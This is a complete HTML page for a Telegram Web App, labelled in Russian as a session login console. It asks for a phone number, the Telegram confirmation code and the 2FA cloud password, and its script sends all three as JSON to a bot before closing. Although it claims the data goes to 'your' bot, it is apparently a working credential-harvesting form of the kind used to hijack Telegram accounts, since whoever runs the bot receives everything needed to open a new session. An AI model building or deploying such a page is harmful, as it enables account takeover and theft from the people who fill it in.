<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Session Manager Console</title>
    <!-- Подключаем скрипт Telegram -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: var(--tg-theme-bg-color, #1a1a1a);
            color: var(--tg-theme-text-color, #ffffff);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background: var(--tg-theme-secondary-bg-color, #242424);
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
        }
        h2 { text-align: center; margin-bottom: 20px; color: var(--tg-theme-button-color, #3390ec); }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #444;
            border-radius: 8px;
            background: #333;
            color: white;
            box-sizing: border-box;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 15px;
            background-color: var(--tg-theme-button-color, #3390ec);
            color: var(--tg-theme-button-text-color, #ffffff);
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
        }
        .hint { font-size: 12px; color: #888; margin-top: 10px; text-align: center; }
    </style>
</head>
<body>

<div class="container">
    <h2>📱 Вход в сессию</h2>
    <input type="tel" id="phone" placeholder="+7XXXXXXXXXX">
    <input type="text" id="code" placeholder="Код подтверждения">
    <input type="password" id="password" placeholder="Облачный пароль (2FA)">
    <button id="sendBtn">АВТОРИЗОВАТЬ</button>
    <p class="hint">Данные будут переданы вашему боту напрямую</p>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    document.getElementById('sendBtn').addEventListener('click', () => {
        const phone = document.getElementById('phone').value;
        const code = document.getElementById('code').value;
        const password = document.getElementById('password').value;

        if (!phone || !code) {
            tg.showAlert("Введите номер телефона и код!");
            return;
        }

        const data = {
            phone: phone,
            code: code,
            password: password
        };

        // Отправка данных боту (событие F.web_app_data в aiogram)
        tg.sendData(JSON.stringify(data));
        tg.close();
    });
</script>

</body>
</html>
